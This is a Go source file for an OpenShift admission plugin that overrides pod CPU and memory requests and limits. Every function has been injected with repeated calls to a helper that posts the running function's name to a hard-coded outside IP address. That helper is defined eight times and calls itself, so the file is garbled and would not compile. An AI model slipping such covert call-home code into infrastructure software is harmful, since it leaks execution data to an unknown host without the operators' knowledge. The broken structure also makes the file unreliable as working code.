package clusterresourceoverride

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"io"
	"strings"
	"k8s.io/klog"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apiserver/pkg/admission"
	"k8s.io/apiserver/pkg/admission/initializer"
	"k8s.io/client-go/informers"
	"k8s.io/client-go/kubernetes"
	corev1listers "k8s.io/client-go/listers/core/v1"
	coreapi "k8s.io/kubernetes/pkg/apis/core"
	"k8s.io/kubernetes/plugin/pkg/admission/limitranger"
	api "github.com/openshift/origin/pkg/autoscaling/admission/apis/clusterresourceoverride"
	"github.com/openshift/origin/pkg/autoscaling/admission/apis/clusterresourceoverride/validation"
	configlatest "github.com/openshift/origin/pkg/cmd/server/apis/config/latest"
	"github.com/openshift/origin/pkg/project/apiserver/registry/projectrequest/delegated"
)

const (
	clusterResourceOverrideAnnotation	= "autoscaling.openshift.io/cluster-resource-override-enabled"
	cpuBaseScaleFactor			= 1000.0 / (1024.0 * 1024.0 * 1024.0)
)

var (
	cpuFloor	= resource.MustParse("1m")
	memFloor	= resource.MustParse("1Mi")
)

func Register(plugins *admission.Plugins) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	plugins.Register(api.PluginName, func(config io.Reader) (admission.Interface, error) {
		pluginConfig, err := ReadConfig(config)
		if err != nil {
			return nil, err
		}
		if pluginConfig == nil {
			klog.Infof("Admission plugin %q is not configured so it will be disabled.", api.PluginName)
			return nil, nil
		}
		return newClusterResourceOverride(pluginConfig)
	})
}

type internalConfig struct {
	limitCPUToMemoryRatio		float64
	cpuRequestToLimitRatio		float64
	memoryRequestToLimitRatio	float64
}
type clusterResourceOverridePlugin struct {
	*admission.Handler
	config			*internalConfig
	nsLister		corev1listers.NamespaceLister
	LimitRanger		*limitranger.LimitRanger
	limitRangesLister	corev1listers.LimitRangeLister
}

var _ = initializer.WantsExternalKubeInformerFactory(&clusterResourceOverridePlugin{})
var _ = initializer.WantsExternalKubeClientSet(&clusterResourceOverridePlugin{})
var _ = admission.MutationInterface(&clusterResourceOverridePlugin{})
var _ = admission.ValidationInterface(&clusterResourceOverridePlugin{})

func newClusterResourceOverride(config *api.ClusterResourceOverrideConfig) (admission.Interface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.V(2).Infof("%s admission controller loaded with config: %v", api.PluginName, config)
	var internal *internalConfig
	if config != nil {
		internal = &internalConfig{limitCPUToMemoryRatio: float64(config.LimitCPUToMemoryPercent) / 100, cpuRequestToLimitRatio: float64(config.CPURequestToLimitPercent) / 100, memoryRequestToLimitRatio: float64(config.MemoryRequestToLimitPercent) / 100}
	}
	limitRanger, err := limitranger.NewLimitRanger(nil)
	if err != nil {
		return nil, err
	}
	return &clusterResourceOverridePlugin{Handler: admission.NewHandler(admission.Create), config: internal, LimitRanger: limitRanger}, nil
}
func (d *clusterResourceOverridePlugin) SetExternalKubeClientSet(c kubernetes.Interface) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	d.LimitRanger.SetExternalKubeClientSet(c)
}
func (d *clusterResourceOverridePlugin) SetExternalKubeInformerFactory(kubeInformers informers.SharedInformerFactory) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	d.LimitRanger.SetExternalKubeInformerFactory(kubeInformers)
	d.limitRangesLister = kubeInformers.Core().V1().LimitRanges().Lister()
	d.nsLister = kubeInformers.Core().V1().Namespaces().Lister()
}
func ReadConfig(configFile io.Reader) (*api.ClusterResourceOverrideConfig, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj, err := configlatest.ReadYAML(configFile)
	if err != nil {
		klog.V(5).Infof("%s error reading config: %v", api.PluginName, err)
		return nil, err
	}
	if obj == nil {
		return nil, nil
	}
	config, ok := obj.(*api.ClusterResourceOverrideConfig)
	if !ok {
		return nil, fmt.Errorf("unexpected config object: %#v", obj)
	}
	klog.V(5).Infof("%s config is: %v", api.PluginName, config)
	if errs := validation.Validate(config); len(errs) > 0 {
		return nil, errs.ToAggregate()
	}
	return config, nil
}
func (a *clusterResourceOverridePlugin) ValidateInitialization() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if a.nsLister == nil {
		return fmt.Errorf("%s did not get a namespace lister", api.PluginName)
	}
	return a.LimitRanger.ValidateInitialization()
}
func isExemptedNamespace(name string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, s := range delegated.ForbiddenNames {
		if name == s {
			return true
		}
	}
	for _, s := range delegated.ForbiddenPrefixes {
		if strings.HasPrefix(name, s) {
			return true
		}
	}
	return false
}
func (a *clusterResourceOverridePlugin) Admit(attr admission.Attributes) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return a.admit(attr, true)
}
func (a *clusterResourceOverridePlugin) Validate(attr admission.Attributes) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return a.admit(attr, false)
}
func (a *clusterResourceOverridePlugin) admit(attr admission.Attributes, mutationAllowed bool) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.V(6).Infof("%s admission controller is invoked", api.PluginName)
	if a.config == nil || attr.GetResource().GroupResource() != coreapi.Resource("pods") || attr.GetSubresource() != "" {
		return nil
	}
	pod, ok := attr.GetObject().(*coreapi.Pod)
	if !ok {
		return admission.NewForbidden(attr, fmt.Errorf("unexpected object: %#v", attr.GetObject()))
	}
	klog.V(5).Infof("%s is looking at creating pod %s in project %s", api.PluginName, pod.Name, attr.GetNamespace())
	ns, err := a.nsLister.Get(attr.GetNamespace())
	if err != nil {
		klog.Warningf("%s got an error retrieving namespace: %v", api.PluginName, err)
		return admission.NewForbidden(attr, err)
	}
	projectEnabledPlugin, exists := ns.Annotations[clusterResourceOverrideAnnotation]
	if exists && projectEnabledPlugin != "true" {
		klog.V(5).Infof("%s is disabled for project %s", api.PluginName, attr.GetNamespace())
		return nil
	}
	if isExemptedNamespace(ns.Name) {
		klog.V(5).Infof("%s is skipping exempted project %s", api.PluginName, attr.GetNamespace())
		return nil
	}
	namespaceLimits := []*corev1.LimitRange{}
	if a.limitRangesLister != nil {
		limits, err := a.limitRangesLister.LimitRanges(attr.GetNamespace()).List(labels.Everything())
		if err != nil {
			return err
		}
		namespaceLimits = limits
	}
	nsCPUFloor := minResourceLimits(namespaceLimits, corev1.ResourceCPU)
	nsMemFloor := minResourceLimits(namespaceLimits, corev1.ResourceMemory)
	klog.V(5).Infof("%s: initial pod limits are: %#v", api.PluginName, pod.Spec)
	if err := a.LimitRanger.Admit(attr); err != nil {
		klog.V(5).Infof("%s: error from LimitRanger: %#v", api.PluginName, err)
	}
	klog.V(5).Infof("%s: pod limits after LimitRanger: %#v", api.PluginName, pod.Spec)
	for i := range pod.Spec.InitContainers {
		if err := updateContainerResources(a.config, &pod.Spec.InitContainers[i], nsCPUFloor, nsMemFloor, mutationAllowed); err != nil {
			return admission.NewForbidden(attr, fmt.Errorf("spec.initContainers[%d].%v", i, err))
		}
	}
	for i := range pod.Spec.Containers {
		if err := updateContainerResources(a.config, &pod.Spec.Containers[i], nsCPUFloor, nsMemFloor, mutationAllowed); err != nil {
			return admission.NewForbidden(attr, fmt.Errorf("spec.containers[%d].%v", i, err))
		}
	}
	klog.V(5).Infof("%s: pod limits after overrides are: %#v", api.PluginName, pod.Spec)
	return nil
}
func updateContainerResources(config *internalConfig, container *coreapi.Container, nsCPUFloor, nsMemFloor *resource.Quantity, mutationAllowed bool) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	resources := container.Resources
	memLimit, memFound := resources.Limits[coreapi.ResourceMemory]
	if memFound && config.memoryRequestToLimitRatio != 0 {
		amount := memLimit.Value() * int64(config.memoryRequestToLimitRatio*100) / 100
		var mod int64
		switch memLimit.Format {
		case resource.BinarySI:
			mod = 1024 * 1024
		default:
			mod = 1000 * 1000
		}
		if rem := amount % mod; rem != 0 {
			amount = amount - rem
		}
		q := resource.NewQuantity(int64(amount), memLimit.Format)
		if memFloor.Cmp(*q) > 0 {
			q = memFloor.Copy()
		}
		if nsMemFloor != nil && q.Cmp(*nsMemFloor) < 0 {
			klog.V(5).Infof("%s: %s pod limit %q below namespace limit; setting limit to %q", api.PluginName, corev1.ResourceMemory, q.String(), nsMemFloor.String())
			q = nsMemFloor.Copy()
		}
		if err := applyQuantity(resources.Requests, corev1.ResourceMemory, *q, mutationAllowed); err != nil {
			return fmt.Errorf("resources.requests.%s %v", corev1.ResourceMemory, err)
		}
	}
	if memFound && config.limitCPUToMemoryRatio != 0 {
		amount := float64(memLimit.Value()) * config.limitCPUToMemoryRatio * cpuBaseScaleFactor
		q := resource.NewMilliQuantity(int64(amount), resource.DecimalSI)
		if cpuFloor.Cmp(*q) > 0 {
			q = cpuFloor.Copy()
		}
		if nsCPUFloor != nil && q.Cmp(*nsCPUFloor) < 0 {
			klog.V(5).Infof("%s: %s pod limit %q below namespace limit; setting limit to %q", api.PluginName, corev1.ResourceCPU, q.String(), nsCPUFloor.String())
			q = nsCPUFloor.Copy()
		}
		if err := applyQuantity(resources.Limits, corev1.ResourceCPU, *q, mutationAllowed); err != nil {
			return fmt.Errorf("resources.limits.%s %v", corev1.ResourceCPU, err)
		}
	}
	cpuLimit, cpuFound := resources.Limits[coreapi.ResourceCPU]
	if cpuFound && config.cpuRequestToLimitRatio != 0 {
		amount := float64(cpuLimit.MilliValue()) * config.cpuRequestToLimitRatio
		q := resource.NewMilliQuantity(int64(amount), cpuLimit.Format)
		if cpuFloor.Cmp(*q) > 0 {
			q = cpuFloor.Copy()
		}
		if nsCPUFloor != nil && q.Cmp(*nsCPUFloor) < 0 {
			klog.V(5).Infof("%s: %s pod limit %q below namespace limit; setting limit to %q", api.PluginName, corev1.ResourceCPU, q.String(), nsCPUFloor.String())
			q = nsCPUFloor.Copy()
		}
		if err := applyQuantity(resources.Requests, corev1.ResourceCPU, *q, mutationAllowed); err != nil {
			return fmt.Errorf("resources.requests.%s %v", corev1.ResourceCPU, err)
		}
	}
	return nil
}
func applyQuantity(l coreapi.ResourceList, r corev1.ResourceName, v resource.Quantity, mutationAllowed bool) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if mutationAllowed {
		l[coreapi.ResourceName(r)] = v
		return nil
	}
	if oldValue, ok := l[coreapi.ResourceName(r)]; !ok {
		return fmt.Errorf("mutated, expected: %v, now absent", v)
	} else if oldValue.Cmp(v) != 0 {
		return fmt.Errorf("mutated, expected: %v, got %v", v, oldValue)
	}
	return nil
}
func minResourceLimits(limitRanges []*corev1.LimitRange, resourceName corev1.ResourceName) *resource.Quantity {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	limits := []*resource.Quantity{}
	for _, limitRange := range limitRanges {
		for _, limit := range limitRange.Spec.Limits {
			if limit.Type == corev1.LimitTypeContainer {
				if limit, found := limit.Min[resourceName]; found {
					limits = append(limits, limit.Copy())
				}
			}
		}
	}
	if len(limits) == 0 {
		return nil
	}
	return minQuantity(limits)
}
func minQuantity(quantities []*resource.Quantity) *resource.Quantity {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	min := quantities[0].Copy()
	for i := range quantities {
		if quantities[i].Cmp(*min) < 0 {
			min = quantities[i].Copy()
		}
	}
	return min
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
